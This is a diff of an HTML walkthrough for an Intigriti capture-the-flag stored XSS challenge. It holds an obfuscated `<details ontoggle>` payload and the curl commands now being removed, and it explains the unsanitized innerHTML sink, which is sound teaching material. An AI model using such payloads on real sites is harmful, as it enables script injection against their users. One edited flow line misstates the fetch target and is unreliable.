@@ -232,46 +232,34 @@ data.forEach(t => {
     <div class="step">
       <div class="step-head"><div class="step-num">1</div><span class="step-title">Register an account</span></div>
       <div class="step-body">
-        <pre><span class="code-lang">bash</span><code>curl -s -X POST https://challenge-0526.intigriti.io/api/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker1337","password":"H4ck3r!"}' \
-  -c /tmp/poc.txt</code></pre>
+        <p>Navigate to <a href="https://challenge-0526.intigriti.io/challenge#register" target="_blank">challenge-0526.intigriti.io/challenge#register</a> and create an account.</p>
       </div>
     </div>
     <div class="step">
-      <div class="step-head"><div class="step-num">2</div><span class="step-title">Authenticate</span></div>
+      <div class="step-head"><div class="step-num">2</div><span class="step-title">Login and go to Profile</span></div>
       <div class="step-body">
-        <pre><span class="code-lang">bash</span><code>curl -s -X POST https://challenge-0526.intigriti.io/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"attacker1337","password":"H4ck3r!"}' \
-  -c /tmp/poc.txt -b /tmp/poc.txt</code></pre>
+        <p>Login at <a href="https://challenge-0526.intigriti.io/challenge#login" target="_blank">challenge-0526.intigriti.io/challenge#login</a>, then navigate to the Profile page.</p>
       </div>
     </div>
     <div class="step">
-      <div class="step-head"><div class="step-num">3</div><span class="step-title">Inject malicious display name</span></div>
+      <div class="step-head"><div class="step-num">3</div><span class="step-title">Set Display Name to the payload</span></div>
       <div class="step-body">
-        <pre><span class="code-lang">bash</span><code>curl -s -X POST https://challenge-0526.intigriti.io/api/profile \
-  -H "Content-Type: application/json" \
-  -d '{"name":"&lt;details ontoggle=&amp;#97lert&amp;#40&amp;#100ocument&amp;#46domain&amp;#41 open&gt;"}' \
-  -c /tmp/poc.txt -b /tmp/poc.txt</code></pre>
-        <p>Verify the payload was stored correctly:</p>
-        <pre><span class="code-lang">bash</span><code>curl -s https://challenge-0526.intigriti.io/api/me -b /tmp/poc.txt</code></pre>
+        <p>At <a href="https://challenge-0526.intigriti.io/challenge#profile" target="_blank">challenge-0526.intigriti.io/challenge#profile</a>, set the Display Name field to:</p>
+        <pre><span class="code-lang">payload</span><code>&lt;details ontoggle=&amp;#97lert&amp;#40&amp;#100ocument&amp;#46domain&amp;#41 open&gt;</code></pre>
       </div>
     </div>
     <div class="step">
-      <div class="step-head"><div class="step-num">4</div><span class="step-title">Publish to the public feed</span></div>
+      <div class="step-head"><div class="step-num">4</div><span class="step-title">Submit any testimonial</span></div>
       <div class="step-body">
-        <pre><span class="code-lang">bash</span><code>curl -s -X POST https://challenge-0526.intigriti.io/api/testimonials \
-  -H "Content-Type: application/json" \
-  -d '{"content":"Great challenge!"}' \
-  -c /tmp/poc.txt -b /tmp/poc.txt</code></pre>
+        <p>Go to <a href="https://challenge-0526.intigriti.io/challenge#testimonials" target="_blank">challenge-0526.intigriti.io/challenge#testimonials</a> and submit any testimonial to publish your display name to the public feed.</p>
       </div>
     </div>
     <div class="step">
-      <div class="step-head"><div class="step-num">5</div><span class="step-title">Trigger — open in browser</span></div>
+      <div class="step-head"><div class="step-num">5</div><span class="step-title">Trigger</span></div>
       <div class="step-body">
-        <p>Any authenticated user visiting this URL triggers the alert immediately with no further interaction:</p>
+        <p>Any authenticated user visiting the URL below will trigger the alert immediately — no interaction required:</p>
         <pre><span class="code-lang">url</span><code>https://challenge-0526.intigriti.io/challenge#testimonials</code></pre>
+        <p style="color:var(--green);font-size:13px;">&#10003; &nbsp;alert(document.domain) fires automatically</p>
       </div>
     </div>
   </section>
@@ -281,7 +269,7 @@ data.forEach(t => {
     <div class="flow">
       <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text">Victim navigates to <span class="fl-hl">#testimonials</span></span></div>
       <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text"><span class="fl-dim">route() &rarr; renderTestimonials() &rarr;</span> <span class="fl-hl">loadTestimonials()</span></span></div>
-      <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text"><span class="fl-dim">fetch('/api/testimonials')</span> returns attacker's entry</span></div>
+      <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text"><span class="fl-dim">fetch('challenge#testimonials')</span> returns attacker's entry</span></div>
       <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text"><span class="fl-bad">nameDiv.innerHTML = t.user_name</span> <span class="fl-dim">— no sanitization</span></span></div>
       <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text"><span class="fl-dim">container.appendChild(card)</span> — element connects to DOM</span></div>
       <div class="flow-line"><span class="fl-arrow">&rarr;</span><span class="fl-text"><span class="fl-dim">&lt;details open&gt; fires</span> <span class="fl-hl">toggle</span> <span class="fl-dim">event automatically</span></span></div>
